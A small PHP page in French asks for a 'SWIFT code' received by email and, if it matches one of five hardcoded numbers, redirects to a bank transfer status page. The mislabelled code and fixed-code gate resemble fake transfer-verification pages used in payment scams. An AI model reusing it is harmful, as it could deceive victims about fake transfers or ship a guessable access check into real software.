<?php
// 🔐 Liste des 5 codes autorisés
$codes_valides = ["23470", "45480", "65332", "55004", "22670"];

$message = "Saisisez votre code reçu par Email";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $code = $_POST["code"];

    // Vérifie si le code saisi est dans la liste
    if (in_array($code, $codes_valides)) {
        header("Location: statut-virement.php");
        exit;
    } else {
        $message = "Code incorrect. Aucun accès au statut du virement.";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Vérification du code</title>
    <link rel="stylesheet" href="verification.css">
</head>
<body>

<div class="container">

    <h1>Vérifiez votre statut</h1>
    <p>Veuillez entrer le code SWIFT reçu.</p>

    <?php if (!empty($message)) : ?>
        <p style="color:red; font-weight:bold;"><?= $message ?></p>
    <?php endif; ?>

    <form method="POST">
        <input type="number" class="form-control" name="code"
               placeholder="Entrez le code SWIFT..." required>

        <button type="submit" class="btn-verifier">Vérifier</button>
    </form>

</div>

</body>
</html>

